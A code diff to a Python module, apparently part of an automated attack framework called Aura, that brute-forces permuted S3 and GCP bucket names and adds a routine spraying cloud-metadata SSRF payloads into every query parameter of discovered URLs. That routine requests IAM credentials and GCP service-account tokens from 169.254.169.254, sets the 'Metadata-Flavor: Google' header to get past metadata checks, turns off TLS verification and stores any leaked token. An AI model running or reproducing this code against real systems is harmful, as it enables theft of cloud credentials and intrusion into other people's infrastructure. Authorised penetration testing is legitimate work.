@@ -1,22 +1,27 @@
 import asyncio
 import re
 import aiohttp
+import httpx
 from typing import List, Dict, Any
 from rich.console import Console
 import xml.etree.ElementTree as ET
 from aura.core.storage import AuraStorage
 from aura.core.brain import AuraBrain
 
-console = Console()
+from aura.ui.formatter import console
+from aura.core.engine_base import AbstractEngine
 
-class AuraCloudRecon:
+class AuraCloudRecon(AbstractEngine):
     """
     v15.0: THE CLOUD PREDATOR
     Automated Discovery of Leaky Buckets & Cloud Assets (v19.4: Full async rewrite)
     """
-    def __init__(self, storage: AuraStorage):
-        self.storage = storage
-        self.brain = AuraBrain()
+    ENGINE_ID = "aura_cloud_recon"
+    
+    def __init__(self, *args, **kwargs):
+        super().__init__()
+        self.storage = kwargs.get("persistence") or kwargs.get("storage")
+        self.brain = kwargs.get("brain") or AuraBrain()
         self.secret_patterns = {
             "AWS Key": r"AKIA[A-Z0-9]{16}",
             "AWS Secret": r"wJalrXUtnFEMI/K7MDENG/bPxRfiCY[a-zA-Z0-9+/]{8}", # Generic pattern
@@ -24,28 +29,43 @@ class AuraCloudRecon:
             "General API Key": r"(?i)(api_key|secret|token|password|pw)\s*[:=]\s*['\"]([a-zA-Z0-9_\-]{16,})['\"]"
         }
 
+    async def run(self):
+        """Standard run method as required by AbstractEngine."""
+        if self.context and self.context.target_url:
+            await self.hunt(self.context.target_url)
+        return []
+
     async def hunt(self, domain: str):
         """Main entry point to scan for cloud assets related to a domain."""
         console.print(f"[bold cyan][*] Cloud Predator: Starting hunt on {domain}[/bold cyan]")
         base_name = domain.split('.')[0]
-        seeds = [
-            base_name,
-            f"{base_name}-data",
-            f"{base_name}-backup",
-            f"{base_name}-prod",
-            f"{base_name}-dev",
-            f"{base_name}-staging",
-            f"{base_name}-assets",
-            f"{base_name}-media",
-        ]
+        
+        # 1. Advanced intelligent permutations
+        suffixes = ["data", "backup", "prod", "production", "dev", "development", 
+                    "staging", "assets", "media", "logs", "test", "v1", "v2", "api", "static", "images"]
+        prefixes = ["s3-", "cloud-", "bucket-", "www-", "app-"]
+        
+        seeds = [base_name, domain.replace(".", "-"), domain]
+        for s in suffixes:
+            seeds.append(f"{base_name}-{s}")
+            seeds.append(f"{base_name}_{s}")
+            seeds.append(f"{s}-{base_name}")
+        for p in prefixes:
+            seeds.append(f"{p}{base_name}")
+            seeds.append(f"{p}{domain.replace('.', '-')}")
+            
+        # Deduplicate
+        seeds = list(set(seeds))
+        console.print(f"[dim cyan]  [+] Generated {len(seeds)} permutations for bucket brute-forcing...[/dim cyan]")
 
-        # Run all cloud checks concurrently
+        # Run all cloud checks concurrently with limits
         await asyncio.gather(
             self._check_aws_s3(seeds, domain),
             self._check_gcp_buckets(seeds, domain),
+            self._inject_ssrf_metadata(domain),
             return_exceptions=True
         )
-        console.print(f"[dim cyan][*] Cloud Predator: Hunt complete for {domain}[/dim cyan]")
+        console.print(f"[dim cyan][*] Cloud Extractor: Hunt complete for {domain}[/dim cyan]")
 
     async def _check_aws_s3(self, seeds: list, domain: str):
         """Check for publicly accessible AWS S3 buckets (async)."""
@@ -67,11 +87,55 @@ class AuraCloudRecon:
                 url = f"https://storage.googleapis.com/{seed}"
                 try:
                     async with session.get(url, timeout=aiohttp.ClientTimeout(total=7)) as r:
+                        # 403 on GCP sometimes leaks project info, but 200 is pure public
                         if r.status == 200:
                             self._log_cloud_asset(domain, url, "GCP Bucket", "Publicly Accessible (200 OK)")
                             await self._inspect_bucket(url, domain, "GCP Bucket")
                 except Exception:
                     pass
+
+    async def _inject_ssrf_metadata(self, domain: str):
+        """Massively injects 169.254.169.254 into all intel endpoint query params."""
+        intel = self.context.get_intel() if self.context and hasattr(self.context, "get_intel") else {}
+        urls = intel.get("urls", set())
+        if not urls: return
+        
+        # Limit to 30 endpoints targeting parameters
+        param_urls = [u for u in urls if "?" in u or "=" in u][:30]
+        if not param_urls: return
+        
+        metadatas = [
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
+        ]
+        
+        console.print(f"[dim cyan]  [+] Spraying SSRF Cloud-Metadata payloads on {len(param_urls)} endpoints...[/dim cyan]")
+        async with httpx.AsyncClient(verify=False, timeout=10) as client:
+            for u in param_urls:
+                import urllib.parse
+                parsed = urllib.parse.urlparse(u)
+                qs = urllib.parse.parse_qs(parsed.query)
+                
+                # Replace every parameter with a metadata payload
+                for meta in metadatas:
+                    mutated_qs = {k: meta for k in qs}
+                    enc_qs = urllib.parse.urlencode(mutated_qs, doseq=True)
+                    target = urllib.parse.urlunparse(parsed._replace(query=enc_qs))
+                    
+                    try:
+                        headers = {"Metadata-Flavor": "Google"} # Bypass GCP header checks
+                        resp = await client.get(target, headers=headers)
+                        body = resp.text
+                        if resp.status_code == 200 and ("AccessKeyId" in body or "access_token" in body):
+                            console.print(f"[bold red][☠️ SSRF] Cloud Metadata Exfiltration Successful at {target}[/bold red]")
+                            if self.storage:
+                                self.storage.add_finding(
+                                    target_value=domain,
+                                    content="SSRF Metadata Exfiltration",
+                                    finding_type="CRITICAL SSRF / Metadata Leak",
+                                    proof=f"IAM Token Leaked: {body[:150]}"
+                                )
+                    except: pass
 
     async def _inspect_bucket(self, url: str, domain: str, asset_type: str):
         """Deeply audits a public bucket for sensitive files and secrets."""
